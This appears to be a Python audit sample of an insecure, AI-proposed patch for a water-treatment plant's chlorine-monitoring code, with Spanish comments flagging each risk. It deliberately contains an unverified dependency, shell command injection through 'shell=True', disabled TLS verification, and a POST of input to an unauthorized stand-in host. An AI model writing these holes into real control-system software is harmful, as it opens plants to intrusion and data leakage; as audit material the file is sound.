import os
import subprocess
import requests

# PARCHE DE IA - SOLO PARA AUDITORIA
# No ejecutar ni fusionar con main.

def leer_cloro_simulado():
    if not os.getenv("PLC_PASSWORD"):
        raise RuntimeError("Falta la variable PLC_PASSWORD")

    return {
        "planta": "Maipo Sur - laboratorio",
        "cloro_mg_l": 0.7
    }


def propuesta_ia_no_segura(entrada):
    # Riesgo 1: dependencia no verificada
    paquete_sugerido = "plc_helper_utils"

    # Riesgo 2: construcción insegura de comandos
    comando = "echo " + entrada
    subprocess.run(comando, shell=True)

    # Riesgo 3 y 4: TLS desactivado y destino no autorizado
    destino = "https://telemetria-no-autorizada.invalid"
    requests.post(
        destino,
        json={"entrada": entrada},
        verify=False
    )

    return paquete_sugerido
